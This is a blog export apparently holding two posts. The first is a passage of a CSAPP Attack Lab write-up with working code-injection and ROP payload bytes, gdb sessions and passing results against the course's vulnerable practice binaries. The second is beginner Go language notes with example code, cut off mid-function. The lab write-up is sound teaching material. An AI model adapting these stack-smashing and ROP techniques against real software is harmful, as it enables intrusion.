位可以任意输入，只是为了填充缓冲区，最后 8 位是我们的构造 touch1 的地址 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00c0 17 40 0000 00 00 00 具体在栈帧中，如图 测试结果 &gt; ./hex2raw -i solution1.hex &gt; solution1.raw&gt; ./ctarget -q &lt; solution1.rawCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00ubuntu@10-13-181-207:~/cuzz/csapp 阶段二第二阶段的任务是在test函数执行完getbuf后去执行touch2，注意touch2有一个参数，我们需要在执行touch2之前把参数val设置为cookie，cookie的值在cookie.txt中。 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val); validate(2); } else { printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val); fail(2); } exit(0);} 使用代码注入攻击，输入的字符串中包含攻击指令，然后将返回地址改成攻击指令的地址。这段程序就是验证传进来的参数val是否和cookie中值相等。本文中我的cookie值为：0x59b997fa 在输入字符串中包含 exploit code 将返回地址设置为 exploit code 开始的地址 在 exploit code 中完成参数设置，将 touch2 的首地址压栈，通过 ret 指令跳到 touch2 执行 具体过程如下： 综上所述，可以得到注入的代码为，创建一个 solution2.s 汇编文件 movq $0x59b997fa, %rdi # 把cookie设置为第一个参数pushq $0x4017ec # 将touch2的首地址压栈ret # 跳转到touch2 将汇编转化为机器指令 &gt; gcc -c solution2.s&gt; objdump -d solution2.oDisassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq 得到的序列为： 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 接下来找到 getbuf 方法中的 %rsp 值，看看缓存区是从哪里开始 (gdb) run -qStarting program: /home/ubuntu/cuzz/csapp/target1/ctarget -qCookie: 0x59b997faBreakpoint 1, getbuf () at buf.c:1212 buf.c: No such file or directory.(gdb) disasDump of assembler code for function getbuf:=&gt; 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retqEnd of assembler dump.(gdb) stepi14 in buf.c(gdb) disasDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp=&gt; 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retqEnd of assembler dump.(gdb) p /x $rsp$1 = 0x5561dc78(gdb) 可以知道 %rsp 的值为 0x5561dc78，构造输入字符串 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 # exploit code00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # 填充78 dc 61 55 00 00 00 00 # 返回地址 测试结果 &gt; ./hex2raw -i solution2.hex &gt; solution2.raw&gt; ./ctarget -q &lt; solution2.rawCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 阶段三这个也是进行代码注入攻击，需要传递一个字符串到 touch3 方法中。 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch3(char *sval){ vlevel = 3; if (hexmatch(cookie, sval)){ printf(&quot;Touch3!: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); validate(3); } else { printf(&quot;Misfire: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); fail(3); } exit(0);}int hexmatch(unsigned val, char *sval){ char cbuf[110]; char *s = cbuf + random() % 100; sprintf(s, &quot;%.8x&quot;, val); return strncmp(sval, s, 9) == 0; # 检查字符串以0结尾} 这次比较字符串，我们不能把他保存在 getbuf栈帧中，因为数据可能会被 hexmatch 重写，放在 getbuf 中并不安全，我们可以放在 test 栈帧中。 具体如图 将 cookie 转为字符串表达形式，对应 ASCII 表 0x45374fee -&gt; 34 35 33 37 34 66 65 65 注入汇编代码 movq $0x5561dca8, %rdipushq $0x4018faret 转换为机器指令 &gt; gcc -c solution3.s&gt; objdump -d solution3.oDisassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq 最终得到 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 //inject code00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 // return address 35 39 62 39 39 37 66 61 00 // cookie 测试结果 &gt; ./hex2raw -i solution3.hex &gt; solution3.raw&gt; ./ctarget -q &lt; solution3.rawCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 阶段四这一阶段还是要劫持 touch2 函数，但是不能用注入攻击，因为使用了两种手段来阻止 栈随机化 将栈锁在的内存标记为不可执行 我们只能通过 ROP 方式来攻击 void test() { int val; val = getbuf(); printf(&quot;NO explit. Getbuf returned 0x%x\\n&quot;, val);}void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val); validate(2); } else { printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val); fail(2); } exit(0);} 注意这里的内容都是 16 进制。另外两个指令是： ret: 一个字节编码 0xc3 nop: 什么都不做，只是让程序计数器加一，一个字节编码 0x90 我们需要代码序列为 popq %raxmovq %rax, %rdi popq %rax的指令字节为：58，所以我们找到了如下函数： 00000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 从中我们可以得出popq %rax指令的地址为：0x4019ab movq %rax, %rdi的指令字节为：48 89 c7，所以我们找到了如下函数： 00000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 从中我们可以得出movq %rax, %rdi指令的地址为：0x4019a2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 # gadget 1fa 97 b9 59 00 00 00 00 # cookiea2 19 40 00 00 00 00 00 # gadget 2ec 17 40 00 00 00 00 00 # touch2地址 具体如图 popq 相当于 %rsp 减 8 指向 cookie，然后（%rsp) 值赋值给 %rax ，接着 ret ，%rsp 减 8 ，指向 movq 这里，这里把 cookie 放到 %rdi 中作为第一个参数。 测试 &gt; ./hex2raw -i solution4.hex &gt; solution4.raw&gt; ./rtarget -q &lt; solution4.rawCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 总结整个 lab 做完，对栈的分配依据栈缓冲区有了更深入的理解，认识了栈溢出攻击和 ROP 攻击，知道了其中原理，以及如何避免这样的攻击，整体来说还是很有意义的 lab。 参考 The Attack Lab: Understanding Buffer Overflow Bugs CSAPP:Lab3-Attack Lab CMU 15-213 CSAPP 深入理解计算机系统","link":"/2020/11/15/CSAPP_Attack_Lab/"},{"title":"Go语言入门笔记","text":"Go语言是Google开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言，它用批判吸收的眼光，融合C语言、Java等众家之长，将简洁、高效演绎得淋漓尽致。 Go语言起源于2007年，当时Google的技术大神们备受C++越来越臃肿的困扰，决心开发一种新的语言来取代C++。他们认为：与其在臃肿的语言上不断增加新的特性，不如简化编程语言。于是，Golang这门新语言应运而生。 在十年多的时间里，Go语言发展势头强劲，凭借其简洁、高效的特性，在竞争激烈的编程语言市场中占据了一席之地。Google、腾讯、阿里等大公司纷纷选择使用Go语言来开发服务应用项目。当然，和其他的编程语言一样，Go语言也有其自身的缺陷。 课程导论 特点 没有“对象”，没有继承，没有泛型，没有 try/catch 有接口，函数式编程，CSP 并发模型（goroutine + channel） 语法简单 基本语法 变量 选择，循环 指针，数组，容器 面向接口 结构体 duck typing 的概念 组合的思想 函数式编程 闭包的概念 工程化 资源管理，错误处理 测试和文档 性能调优 并发编程 goroutine 和 channel 理解调度器 基本语法HelloWorldpackage mainimport &quot;fmt&quot;func main() { fmt.Println(&quot;Hello World!&quot;)} 变量定义package mainimport &quot;fmt&quot;// 默认变量值func variableZeroValue() { var a int var s string fmt.Println(a, s)}// 定义变量值func variableInitialValue() { var a, b int = 3, 4 var s string = &quot;abc&quot; fmt.Println(a, b, s)}// 变量推断func variableTypeDeduction() { var a, b, c = 1, &quot;abc&quot;, true fmt.Println(a, b, c)}// 变量推断简写func variableShorter() { a, b, c := 1, &quot;abc&quot;, true fmt.Println(a, b, c)}// 全局变量var a = 1// 全局变量定义不能使用 :=// b := 2// 方便定义多个var ( b = &quot;abc&quot; c = 1 d = true)func main() { variableZeroValue() variableInitialValue() variableTypeDeduction() variableShorter()} 内建变量类型 bool, stiring (u)int, (u)int8, (u)int16, (u)int32, (u)int64, uintptr byte, rune float32, float64, complex64, complex128 常量与枚举package mainimport ( &quot;fmt&quot; &quot;math&quot;)func tri() { a, b := 3, 4 var c int // 先把 int 转 float64 再转回 int c = int(math.Sqrt(float64(a*a + b*b))) fmt.Println(c)}// 定义常量func consts() { var c int // 指定类型, 下面需要强转为 float64 // const a, b int = 3, 4 // c = int(math.Sqrt(float64(a*a + b*b))) // 不指定类型, 不需要强转为 float64 const a, b = 3, 4 c = int(math.Sqrt(a*a + b*b)) fmt.Println(c)}// 定义枚举func enums() { //const ( // cpp = 0 // java = 1 // python = 2 // golang = 3 //) // 使用 iota 自增加，与上面一样 const ( cpp = iota java python golang _ // 跳开 4 javascript ) fmt.Println(cpp, java, python, golang, javascript) // 0 1 2 3 5 // b, kb, mb, gb, tb, pb const ( b = 1 &lt;&lt; (10 * iota) kb mb gb tb pb ) fmt.Println(b, kb, mb, gb, tb, pb) // 1 1024 1048576 1073741824 1099511627776 1125899906842624}func main() { tri() consts() enums()} 条件语句package mainimport ( &quot;fmt&quot; &quot;io/ioutil&quot;)// iffunc read() { const filename = &quot;abc.txt&quot; // 读取文件 contents, err := ioutil.ReadFile(filename) if err != nil { fmt.Println(err) } else { fmt.Printf(&quot;%s\\n&quot;, contents) } // 也可以这样写 if contents, err := ioutil.ReadFile(filename); err != nil { fmt.Println(err) } else { fmt.Printf(&quot;%s\\n&quot;, contents) }}// switchfunc eval(a, b int, op string) int { var result int // switch 会自动 break, 除非使用 fallthrough switch op { case &quot;+&quot;: result = a + b case &quot;-&quot;: result = a - b case &quot;*&quot;: result = a * b case &quot;/&quot;: result = a / b default: panic(&quot;unsupported operator: &quot; + op) } return result}// switchfunc grade(score int) string { // switch 后面没有表达式 switch { case score &lt; 0 || score &gt; 100: panic(&quot;wrong score&quot;) case score &lt; 60: return &quot;E&quot; case score &lt; 70: return &quot;D&quot; case score &lt; 80: return &quot;C&quot; case score &lt; 90: return &quot;B&quot; case score &lt;= 100: return &quot;A&quot; } return &quot;&quot;}func main() { read() fmt.Println(eval(1, 2, &quot;+&quot;)) // 3 grade(100)} 循环package mainimport ( &quot;bufio&quot; &quot;fmt&quot; &quot;os&quot; &quot;strconv&quot;)// 转为二进制func convertToBin(n int) string { res := &quot;&quot; for ; n &gt; 0; n /= 2 { lsb := n % 2 res = strconv.Itoa(lsb) + res } return res}// 打印文件func printFile(fileName string) { file, err := os.Open(fileName) if err != nil { panic(err) } scanner := bufio.NewScanner(file) for scanner.Scan() { fmt.Println(scanner.Text()) }}// 死循环func forever() { for { fmt.Println(&quot;forever&quot;) }}func main() { fmt.Println( convertToBin(5), convertToBin(13), ) printFile(&quot;abc.txt&quot;); forever()} 函数package mainimport ( &quot;fmt&quot; &quot;math&quot;)// 返回多个值func div(a, b int) (int, int) { return a / b, a % b}// 可以对返回值命名func div2(a, b int) (q, r int) { return a / b, a % b}// 返回 errorfunc eval(a, b int, op string) (int, error) { switch op { case &quot;+&quot;: return a + b, nil case &quot;-&quot;: return a - b, nil case &quot;*&quot;: return a * b, nil case &quot;/&quot;: return a / b, nil default: return 0, fmt.Errorf(&quot;unsupported opration: %s&quot;, op) }}// 使用函数式编程func apply(op func(int, int) int, a, b int) int { return op(a, b)}// 可变参数func sum(numbers ...int) int { sum := 0 for i := range numbers { sum += numbers[i] } return sum}func pow(a, b int) int { return int(math.Pow(float64(a), float64(b)))}func main() { i, i2 := div(5, 3) fmt.Println(i, i2) q, r := div2(5, 3) fmt.Println(q, r) res, err := eval(1, 2, &quot;&amp;&quot;) // unsupported opration: &amp; if err != nil { fmt.Println(err) } else { fmt.Println(res) } fmt.Println(apply(pow, 2, 2)) // 4 fmt.Println(sum(1, 2, 3, 4)) // 10} 指针package mainimport &quot;fmt&quot;// 使用指针func swap(a *int, b *int) { *b, *a = *a, *b}func swap2(a, b int) (int, int) { return b, a}func main() { a, b := 3, 4 swap(&amp;a, &amp;b) fmt.Println(a, b) // 4 3 a, b = 3, 4 a, b = swap2(a, b) fmt.Println(a, b) // 4 3} 数组、切片和容器数组package mainimport &quot;fmt&quot;// 数组定义func defineArray() { // 定义数组的方法 var arr1 [5]int arr2 := [3]int{1, 3, 5} arr3 := [...]int{2, 4, 6, 8} fmt.Println(arr1, arr2, arr3) // [0 0 0 0 0] [1 3 5] [2 4 6 8] // 定义二维数组 var grid [2][3]int fmt.Println(grid) // [[0 0 0] [0 0 0]]}// 遍历数组func printArray() { arr := [...]int{2, 4, 6, 8} for i := 0; i &lt; len(arr); i++ { fmt.Println(arr[i]) } // 通过 range 可以获取下标 for i := range arr { fmt.Println(arr[i]) } // 获取下标和值 for i, v := range arr { fmt.Println(i, v) } // 只获取值, 可以使用 _ 来省略变量 for _, v := range arr { fmt.Println(v) }}// [3]int 和 [5]int 是不同的类型func printArray2(arr [5]int) { fmt.Println(arr)}// 数组是值类型func printArray3(arr [5]int) { arr[0] = 100 fmt.Println(arr) // [100, 0, 0, 0, 0]}// 传递指针func printArray4(arr *[5]int) { arr[0] = 100 fmt.Println(*arr) // [100, 0, 0, 0, 0]}func main() { defineArray() printArray() var arr1 [5]int // arr2 := [3]int{1, 3, 5} // arr3 := [...]int{2, 4, 6, 8, 10} // [3]int 和 [5]int 是不同的类型 printArray2(arr1) // 在函数里面改变数组的值 // printArray2(arr2) // cannot use arr2 (type [3]int) as type [5]int in argument to printArray2 // 在函数里改变了数组第一个值, 后面打印还是不变，每次传递数组都是一个副本 printArray3(arr1) fmt.Println(arr1) // [0, 0, 0, 0, 0] // 传递地址过去就会改变 printArray4(&amp;arr1) fmt.Println(arr1) // [100, 0, 0, 0, 0]} 切片package mainimport &quot;fmt&quot;// 切片func mySlice() { arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} fmt.Println(&quot;arr[2:6] = &quot;, arr[2:6]) // arr[2:6] = [2 3 4 5] fmt.Println(&quot;arr[:6] = &quot;, arr[:6]) // arr[2:6] = [2 3 4 5] fmt.Println(&quot;arr[2:] = &quot;, arr[2:]) // arr[2:] = [2 3 4 5 6 7] fmt.Println(&quot;arr[:] = &quot;, arr[:]) // arr[:] = [0 1 2 3 4 5 6 7]}// 更新func updateSlice(slice []int) { slice[0] = 2019}// 扩展func extendSlice() { arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} // 我们知道 s1 只有 4 个元素, 但是 s2 还是能 s1 := arr[2:6] s2 := s1[3:5] fmt.Println(s1) // [2 3 4 5] fmt.Println(s2) // [5 6] fmt.Printf(&quot;len=%d, cap=%d&quot;, len(s1), cap(s1)) // len=4, cap=6}// 添加func appendSlice() { arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} // 添加元素如果超过了 cap, 系统会重新分配更大的底层数组 // 由于值的传递关系, 必须接受 append 的返回值 s1 := arr[2:6] s2 := append(s1, 100) s3 := append(s2, 100) s4 := append(s3, 100) s5 := append(s4, 100) fmt.Println(s1, s2, s3, s4, s5) // [2 3 4 5] [2 3 4 5 100] [2 3 4 5 100 100] [2 3 4 5 100 100 100] [2 3 4 5 100 100 100 100]}// 创建 slicefunc createSlice() { // 0. 创建一个空的 slice var s []int // 发现 cap 是从 1 2 4 8 16 32... 扩大 for i := 0; i &lt; 100; i++ { s = append(s, 1+2*i) printSlice(s) } // 1. 创建一个带有值的 slice s1 := []int{1, 2, 3, 4, 5} printSlice(s1) // len=5, cap=5, slice=[1 2 3 4 5] // 2. 创建一个 cap = 16 s2 := make([]int, 16) printSlice(s2) // len=16, cap=16, slice=[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] // 3. 创建一个 len = 10, cap = 32 s3 := make([]int, 10, 32) // len=10, cap=32, slice=[0 0 0 0 0 0 0 0 0 0] printSlice(s3)}// 复制func copySlice() { src := []int{1, 2, 3} dst := make([]int, 16) fmt.Println(dst) // [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] copy(dst, src) fmt.Println(dst) // [1 2 3 0 0 0 0 0 0 0 0 0 0 0 0 0]}// 删除func deleteSlice() { // 删除下标为3的元素 s := []int{0, 1, 2, 3, 4, 5, 6, 7, 8} s = append(s[:3], s[4:]...) // s[4:]... 转换为可变参数 fmt.Println(s) // [0 1 2 4 5 6 7 8] // 删除第一个 s1 := []int{0, 1, 2, 3, 4, 5, 6, 7, 8} s1 = s1[1:] fmt.Println(s1) // [1 2 3 4 5 6 7 8] // 删除最后一个 s2 := []int{0, 1, 2, 3, 4, 5, 6, 7, 8} s2 = s2[:len(s2) - 1] fmt.Println(s2) // [0 1 2 3 4 5 6 7]}func printSlice(s []int) { fmt.Printf(&quot;len=%d, cap=%d, slice=%v \\n&quot;, len(s), cap(s), s)}func main() { mySlice() arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} slice1 := arr[:] fmt.Println(&quot;Before update: &quot;, slice1) // Before update: [0 1 2 3 4 5 6 7] updateSlice(slice1) fmt.Println(&quot;After update: &quot;, slice1) // After update: [2019 1 2 3 4 5 6 7] extendSlice() appendSlice() createSlice() copySlice() deleteSlice()} Mappackage mainimport &quot;fmt&quot;// 定义 mapfunc defineMap() { // 定义一个带默认值的 map m1 := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } // 定义一个 empty map m2 := make(map[string]string) // 定义一个 nil map var m3 map[string]string fmt.Println(m1, m2, m3) // map[a:A b:B] map[] map[]}// 遍历 mapfunc traversingMap() { m := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } // 打印 key value for k, v := range m { fmt.Println(k, v) } // 只打印 key for k := range m { fmt.Println(k) } // 只打印 value for _, v := range m { fmt.Println(v) }}// 判断是否存在func containMap() { m := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } value, ok := m[&quot;c&quot;] if ok { fmt.Println(value) } else { fmt.Println(&quot;不存在&quot;) } if value, ok := m[&quot;b&quot;]; ok { fmt.Println(value) } else { fmt.Println(&quot;不存在&quot;) }}// 删除元素func deleteMap() { m := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } fmt.Println(m) // map[a:A b:B] delete(m, &quot;a&quot;) fmt.Println(m) // map[b:B]}func main() { defineMap() traversingMap() containMap() deleteMap()} 例题：查找最长不重复子串 package mainimport &quot;fmt&quot;// 查早最长不重复子串func lengthOfSubString(s string) int { start := 0 maxLength := 0 lastOccuredMap := make(map[rune]int) for i, ru := range []rune(s) { if lastI, ok := lastOccuredMap[ru]; ok &amp;&amp; lastI &gt;= start { start = lastI + 1 } if i-start+1 &gt; maxLength { maxLength = i - start + 1 } lastOccuredMap[ru] = i } return maxLength}func main() { fmt.Println(lengthOfSubString(&quot;aaa&quot;)) fmt.Println(lengthOfSubString(&quot;abab&quot;)) fmt.Println(lengthOfSubString(&quot;abc&quot;)) fmt.Println(lengthOfSubString(&quot;abcabc&quot;))} 字符和字符串处理package mainimport &quot;fmt&quot;func runeTest() { s := &quot;cuzz是我!&quot; for i, b := range []byte(s) { fmt.Printf(&quot;(%d %X %c) &quot;, i, b, b) } fmt.Println() for i, u := range s { fmt.Printf(&quot;(%d %X %c) &quot;, i, u, u) } fmt.Println() for i, r := range []rune(s) { fmt.Printf(&quot;(%d %X %c) &quot;, i, r, r) } // 输出 // (0 63 c) (1 75 u) (2 7A z) (3 7A z) (4 E6 æ) (5 98 ) (6 AF ¯) (7 E6 æ) (8 88 ) (9 91 ) (10 21 !) // (0 63 c) (1 75 u) (2 7A z) (3 7A z) (4 662F 是) (7 6211 我) (10 21 !) // (0 63 c) (1 75 u) (2 7A z) (3 7A z) (4 662F 是) (5 6211 我) (6 21 !) // 说明 range s 使用的 utf-8 遍历, 但是观察下标发现不是连续的 // ascii 转为 utf-8 如:(4 E6) (5 98) (6 AF) -&gt; (4 662F) // 使用 []rune() 转换可以使下标连续输出}func main() { runeTest()} 面向对象 go 语言仅支持封装，不支持继承和多态 go 语言没有 class，只有 struct 结构体和方法package mainimport ( &quot;fmt&quot;)// 定义结构体, 小写对外不可见type treeNode struct { value int left, right *treeNode}// setter, 错误, 由于 go 是传值, 不会改变func (node treeNode) setVal(value int) { node.value = value}func (node *treeNode) setValue(value int) { node.value = value}// 给结构体定义方法 node.print()func (node treeNode) print() { fmt.Println(node.value)}// 普通的方法 print(node)func print(node treeNode) { fmt.Println(node.value)}// 定义一个工厂方法func createNode(value int) *treeNode { return &amp;treeNode{value: value}}// 遍历func (node *treeNode) traverse() { if node == nil { return } node.left.traverse() node.print() node.right.traverse()}func main() { // 定义一个空的结构体 var node treeNode fmt.Println(node) // {0 &lt;nil&gt; &lt;nil&gt;} // 使用构造器定义一个结构体 node2 := treeNode{ value: 1, left: &amp;treeNode{}, // 取地址 right: new(treeNode), // new() 获取的是地址 } fmt.Println(node2) // {1 0xc00000c0c0 0xc00000c0a0} // 使用工厂方法创建 node3 := treeNode{ value: 0, } node3.left = createNode(1) node3.right = createNode(2) fmt.Println(node3) // {0 0xc00008e0a0 0xc00008e0c0} // 区别 node.print() // 0 print(node) // 0 // 不会改变, go 是传值 node.setVal(1) node.print() // 0 // 会改变 node.setValue(1) node.print() // 1 fmt.Println() // 中顺遍历 0 // 1 2 node3.traverse() // 1 0 2} 包和封装 包 每个目录一个包 main 包包含可执行入口 为结构定义的方法必须放在同一包内 可以是不同的文件 封装 一般使用驼峰命名 首字母大写表示 public 首字母小写表示 private Queue.go package queueimport &quot;fmt&quot;type Queue []intfunc (q *Queue) Push(v int) { *q = append(*q, v)}func (q *Queue) Pop() int { head := (*q)[0] *q = (*q)[1:] return head}func (q *Queue) Head() int { return (*q)[0]}func (q *Queue) IsEmpty() bool { return len(*q) == 0}func (q *Queue) Print() { for _, v := range *q { fmt.Print(v, &quot; &quot;) } fmt.Println()} test.go package mainimport ( &quot;awesomeProject/queue&quot; &quot;fmt&quot;)func main() { // 定义一个有默认值的队列 q := queue.Queue{1} q.Push(2) q.Push(3) q.Push(4) q.Print() // 1 2 3 4 fmt.Println(q.Pop()) // 1 q.Print() // 2 3 4 q.Pop() q.Pop() q.Pop() fmt.Println(q.IsEmpty()) // true} 项目结构环境变量： GOROOT：go语言自带的类库 GOPATH：用户源代码目录 src：源文件 pkg：build 的之后的中间文件 bin：可执行文件 接口duck typing “像鸭子走路，像鸭子叫…”，那么就是鸭子 描述事物的外部行为而非内部结构 严格说 go 属于结构化类型系统，类似 duck typing 接口定义和实现定义一个假的发送请求，有一个 Get 方法 package mocktype Retriever struct { Contents string}func (r Retriever) Get(url string) string { return url + &quot;hi, cuzz...&quot;} 定义一个真正发送请求，有一个 Get 方法 package workimport ( &quot;net/http&quot; &quot;net/http/httputil&quot; &quot;time&quot;)type Retriever struct { UserAgent string TimeOut time.Duration}func (r Retriever) Get(url string) string { resp, err := http.Get(url) if err != nil { panic(err) } result, err := httputil.DumpResponse(resp, true) resp.Body.Close() if err != nil { panic(err) } return string(result)} 测试 package mainimport ( &quot;awesomego/retriever/mock&quot; &quot;awesomego/retriever/work&quot; &quot;fmt&quot;)// 定义一个接口type Retriever interface { Get(url string) string}// 传入接口func download(r Retriever) string { return r.Get(&quot;http://blog.cuzz.site&quot;)}func main() { // 接口定义 // var mockRetriever Retriever // mockRetriever = mock.Retriever{} mockRetriever := mock.Retriever{} fmt.Println(download(mockRetriever)) workRetriever := work.Retriever{} fmt.Println(download(workRetriever))} 我们发现在接口是调用放定义的，结构体中的接口也是隐式的，结构体满足接口中的方法，就可以说这个结构体实现了这个接口。 接口的值类型在golang中，接口值是由两部分组成的，一部分是接口的类型，另一部分是该类型对应的值，我们称其为动态类型和动态值。 func main() { mockRetriever := mock.Retriever{} fmt.Printf(&quot;%T, %v\\n&quot;, mockRetriever, mockRetriever) // mock.Retriever, {} workRetriever := work.Retriever{} fmt.Printf(&quot;%T, %v\\n&quot;, workRetriever, workRetriever) // work.Retriever, { 0s}} 接口组合package main// 定义一个接口type Retriever interface { Get(url string) string}// 定义另一个接口type Poster interface { Post(url string, params map[string]string)}// 接口组合type RetrieverAndPoster interface { Retriever Poster // 也可以定义其他方法 AnotherMethod()}func main() {} 常用系统接口1、Stringer Stringer接口中的 string 相当与 Java #toString 方法 package workimport ( &quot;fmt&quot; &quot;time&quot;)type Retriever struct { UserAgent string TimeOut time.Duration}func (r Retriever) String() string { return fmt.Sprintf(&quot;UserAgent: %v, TimeOut: %v&quot;, r.UserAgent, r.TimeOut)} 测试 package mainimport ( &quot;awesomego/retriever/work&quot; &quot;fmt&quot; &quot;time&quot;)func main() { workRetriever := work.Retriever{&quot;Mozilla/5.0&quot;, time.Minute} fmt.Println(workRetriever) // UserAgent: Mozilla/5.0, TimeOut: 1m0s} 2、Reader type Reader interface { Read(p []byte) (n int, err error)} 3、Writer type Writer interface { Write(p []byte) (n int, err error)} 函数式编程 函数是一等公民：参数，变量，返回值都可以是函数 高级函数 闭包 package mainimport &quot;fmt&quot;// 定义一个 adder 函数, 没有参数, 返回值是一个函数func adder() func(int) int { sum := 0 return func(v int) int { sum += v return sum }}// 定义斐波那契数列func fibonacci() func() int{ a, b := 0, 1 return func() int { a, b = b, a + b fmt.Println(a) return a }}func main() { a := adder() for i := 0; i &lt; 10; i++ { fmt.Printf(&quot;0 + 1 + ... + %d = %d\\n&quot;, i, a(i)) } f := fibonacci() f() // 1 f() // 1 f() // 2 f() // 3 f() // 5} 资源管理与出错处理defer 调用你可以在 Go 函数中添加多个defer语句，当函数执行到最后时，这些 defer 语句会按照逆序执行（即最后一个defer语句将最先执行），最后该函数返回。特别是当你在进行一些打开资源的操作时，遇到错误需要提前返回，在返回前你需要关闭相应的资源，不然很容易造成资源泄露等问题。如下代码所示，我们一般写打开一个资源是这样操作的： func CopyFile(dst, src string) (w int64, err error) { srcFile, err := os.Open(src) if err != nil { return } defer srcFile.Close() dstFile, err := os.Create(dst) if err != nil { return } defer dstFile.Close() return io.Copy(dstFile, srcFile)} 错误处理错误处理是任何语言都需要考虑到的问题，而 Go 语言在错误处理上解决得更为完善，优雅的错误处理机制是 Go 语言的一大特点。 1、error Go 语言引入了一个错误处理的标准模式，即error接口，该接口定义如下： type error interface { Error() string} 对于大多数函数，如果要返回错误，可以将error作为多返回值的最后一个： func foo(param int)(ret int, err error) { ... } 调用时的代码： n, err := foo(0)if err != nil { // 错误处理} else { // 使用返回值n} 2、panic 停止当前函数执行 一直向上返回，执行每一层的 defer 如果没有遇见 recover，程序退出 3、recover 仅在 defer 中调用 获取 panic 的值 如果无法处理，可以重新 panic package mainimport ( &quot;fmt&quot;)func tryRecover() { // 匿名函数里 defer func() { r := recover() if err, ok := r.(error); ok { fmt.Println(&quot;Error occurred: &quot;, err) } else { panic(fmt.Sprintf(&quot;I don't know what to do: %v&quot;, 